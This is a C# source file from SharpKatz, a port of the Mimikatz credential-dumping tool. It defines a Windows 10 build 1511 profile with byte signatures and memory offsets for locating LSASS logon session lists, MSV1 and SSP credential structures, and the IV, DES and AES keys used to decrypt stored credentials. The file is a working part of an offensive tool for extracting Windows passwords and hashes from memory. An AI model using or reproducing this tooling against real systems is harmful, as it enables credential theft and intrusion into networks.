﻿using SharpKatz.Module;
using System;

namespace SharpKatz.WinBuild
{
    class WinBuild1511 : IWinBuild
    {
        public int build { get; set; }
        public Type PrimaryCredentialsType { get; set; }
        public Type PrimaryCredentialType { get; set; }
        public Type ListType { get; set; }
        public int LOGONSESSIONLISTOFFSET { get; set; }
        public int LOGONSESSIONSLISTCOUNTOFFSET { get; set; }
        public byte[] logonSessionListSign { get; set; }
        public long IV_OFFSET { get; set; }
        public long DES_OFFSET { get; set; }
        public long AES_OFFSET { get; set; }
        public byte[] keyIVSig { get; set; }
        public byte[] logSessListSig { get; set; }
        public int ListTypeSize { get; set; }
        public byte[] SspCredentialListSign { get; set; }
        public int CREDENTIALLISTOFFSET { get; set; }
        public byte[] LiveLocateLogonSession { get; set; }
        public int LIVESSPLISTOFFSET { get; set; }

        byte[] PTRN_WALL_LiveLocateLogonSession = { 0x74, 0x25, 0x8b };
        byte[] PTRN_WIN10_SspCredentialList = { 0x24, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15 };
        byte[] PTRN_WIN6_PasswdSet = { 0x48, 0x3b, 0xd9, 0x74 };
        byte[] PTRN_WN6x_LogonSessionList = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
        byte[] keyIVSigAll = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };

        public unsafe WinBuild1511()
        {
            PrimaryCredentialsType = typeof(Msv1.KIWI_MSV1_0_PRIMARY_CREDENTIALS);
            PrimaryCredentialType = typeof(Msv1.MSV1_0_PRIMARY_CREDENTIAL_10);
            ListType = typeof(Msv1.KIWI_MSV1_0_LIST_63);
            ListTypeSize = sizeof(Msv1.KIWI_MSV1_0_LIST_63);

            build = OSVersionHelper.KULL_M_WIN_BUILD_10_1511;
            logonSessionListSign = PTRN_WN6x_LogonSessionList;

            LOGONSESSIONLISTOFFSET = 16;
            LOGONSESSIONSLISTCOUNTOFFSET = -4;

            keyIVSig = keyIVSigAll;

            IV_OFFSET = 61;
            DES_OFFSET = -73;
            AES_OFFSET = 16;

            logSessListSig = PTRN_WIN6_PasswdSet;

            SspCredentialListSign = PTRN_WIN10_SspCredentialList;

            CREDENTIALLISTOFFSET = 14;
        }
    }
}
